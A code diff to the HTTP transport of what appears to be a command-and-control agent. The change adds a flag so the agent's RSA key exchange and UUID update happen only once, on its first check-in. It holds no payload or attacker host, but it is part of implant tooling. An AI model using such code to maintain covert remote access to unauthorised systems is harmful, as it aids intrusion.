@@ -35,6 +35,8 @@ namespace HttpTransport
         // synthesis of ProxyHost and ProxyPort
         private string ProxyAddress;
 
+        private bool _uuidNegotiated = false;
+
         public HttpProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
         {
             CallbackInterval = int.Parse(data["callback_interval"]) * 1000;
@@ -170,7 +172,7 @@ namespace HttpTransport
 
         public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
         {
-            if (EncryptedExchangeCheck)
+            if (EncryptedExchangeCheck && !_uuidNegotiated)
             {
                 var rsa = Agent.GetApi().NewRSAKeyPair(4096);
 
@@ -196,7 +198,11 @@ namespace HttpTransport
             return SendRecv<CheckinMessage, MessageResponse>(checkinMsg, delegate (MessageResponse mResp)
             {
                 Connected = true;
-                ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
+                if (!_uuidNegotiated)
+                {
+                    ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
+                    _uuidNegotiated = true;
+                }
                 return onResp(mResp);
             });
         }
